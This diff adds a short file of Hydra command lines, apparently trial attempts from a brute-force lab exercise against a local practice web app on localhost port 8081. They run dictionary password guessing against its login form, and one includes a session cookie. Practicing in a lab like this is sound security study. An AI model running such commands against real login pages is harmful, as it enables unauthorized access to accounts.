@@ -1,0 +1,13 @@
+hydra -L diccionario.txt -P diccionario.txt localhost -s 8081 http-get-form "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect." -c "Cookie: PHPSESSID=47455dbd3c95b59af75ea6b55a8ac3cf; security=low"
+
+hydra -L diccionario.txt -P diccionario.txt localhost -s 8081 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."
+
+hydra -L diccionario.txt -P diccionario.txt localhost -s 8081 http-get-form "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:S=Username and/or password incorrect." 
+
+hydra -L diccionario.txt -P diccionario.txt localhost -s 8081 http-get-form "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect." 
+
+hydra -L diccionario.txt -P diccionario.txt 127.0.0.1 -s 8081 http-get-form "/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:S=Username and/or password incorrect." 
+
+hydra -L diccionario.txt -P diccionario.txt 127.0.0.1 -s 8081 http-post-form "/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:S=Username and/or password incorrect." 
+
+hydra -L diccionario.txt -P diccionario.txt 127.0.0.1 -s 8081 http-post-form "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect." 
